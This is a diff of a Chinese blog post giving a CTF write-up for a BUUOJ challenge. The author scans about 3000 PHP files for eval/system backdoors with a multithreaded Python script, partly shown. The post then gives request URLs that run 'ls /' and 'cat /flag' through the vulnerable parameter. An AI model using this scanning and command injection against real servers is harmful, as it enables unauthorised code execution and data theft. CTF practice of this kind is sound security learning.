@@ -1,20 +1,25 @@
 ---
 layout: post
 title:  "2019-11-14-01"
-description: 你无法同时拥有
+description: 将两件熟悉却无相关的事物刻意联系到一起，可以加强冲突场景的记忆;将一件熟悉和一件陌生的事物联系到一起，可以加强对陌生事物的记忆
 date:   2019-11-14
 tags: python php 命令执行
 excerpt_separator: ~~~
 ---
-你无法同时拥有
+将两件熟悉却无相关的事物刻意联系到一起，可以加强冲突场景的记忆
+
+将一件熟悉和一件陌生的事物联系到一起，可以加强对陌生事物的记忆
+
 ~~~  
 ## Ready
 页面有提示www.tar.gz ,此为文件格式,应该是添加在url路径后面将该文件下载下来.下载下来后发现有3000份左右的php文件,随便打开几个文件查看,发现里面有很多$_GET['...'],$_POST['...'],assert,eval,system之类的
+
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (5).png)
+
 判断这里的文件中有一个文件里面的某个参数存在命令执行/代码执行漏洞(shell),类似eval($_GET[xx]) 或者 system($_GET[xx]),于是用了一个大佬写的脚本(已修改)
 
 (测试了很多脚本,该脚本效率最高,且很准确,适合给以后做参考)
-{% highlight python%}
+```python
 import os
 import requests
 import re
@@ -81,22 +86,37 @@ def get_content(file):
 for i in files:                                                         #加入多线程
    t = threading.Thread(target=get_content, args=(i,))
    t.start()
-{% endhighlight %}
+```
 通过检测返回的页面是否有'xxxxxx'(如果存在代码执行/命令执行漏洞,echo 'xxxxxx';这条命令将被执行)  
+
 !!!!但!!!!  
+
 不要直接对目标网站一直提交数据,会容易崩溃,进而导致无法检测出正确的文件及参数
 经别人writeup提醒,在本地搭建php环境测试(直接把测试目录src丢入dashboard目录就行).于是准确测出了结果
+
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (9).png)
+
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (7).png)
+
 (经测试,无论是system()还是eval(),如果存在漏洞,echo 'xxxxxx';都能返回相应内容)
+
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (8).png)
-构造参数执行"ls /"命令  
+
+构造参数执行"ls /"命令 
+``` 
 http://df3acaa2-1ce6-48b1-8126-cf67d8c4a8be.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=ls%20/
+```
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (10).png)
-构造参数执行"cat /flag"命令  
+
+构造参数执行"cat /flag"命令 
+``` 
 http://df3acaa2-1ce6-48b1-8126-cf67d8c4a8be.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
+```
 ![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (12).png)
+
 ## 知识点:
 1.python脚本多线程和一次提交多个payload  
+
 2.本地搭php环境测试  
+
 3.eval和system用法(echo是linux命令,不是php命令),system()命令执行漏洞,通过get的方法传递参数
